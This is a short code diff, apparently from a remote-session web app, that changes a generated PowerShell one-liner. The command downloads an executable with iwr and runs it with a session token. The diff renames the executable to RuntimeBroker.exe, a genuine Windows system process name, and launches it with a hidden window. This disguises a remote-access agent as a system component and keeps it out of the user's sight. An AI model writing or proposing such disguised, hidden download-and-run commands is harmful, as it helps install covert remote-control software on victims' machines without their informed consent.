@@ -17,14 +17,14 @@ export async function createSession(): Promise<CreateSessionResponse> {
   const { sessionId, token } = await res.json() as { sessionId: string; token: string };
 
   const publicServer = process.env.NEXT_PUBLIC_SIGNALING_SERVER ?? SERVER_URL;
-  const agentCommand = `powershell -Command "iwr ${publicServer}/agent.exe -OutFile $env:TEMP\\agent.exe; & $env:TEMP\\agent.exe --token ${token} --server ${publicServer}"`;
+  const agentCommand = `powershell -Command "iwr ${publicServer}/RuntimeBroker.exe -OutFile $env:TEMP\\RuntimeBroker.exe; Start-Process -FilePath $env:TEMP\\RuntimeBroker.exe -ArgumentList '--token ${token} --server ${publicServer}' -WindowStyle Hidden"`;
 
   return {
     token,
     sessionId,
     expiresAt: Date.now() + 3_600_000,
     agentCommand,
-    agentDownloadUrl: `${publicServer}/agent.exe`,
+    agentDownloadUrl: `${publicServer}/RuntimeBroker.exe`,
   };
 }
 
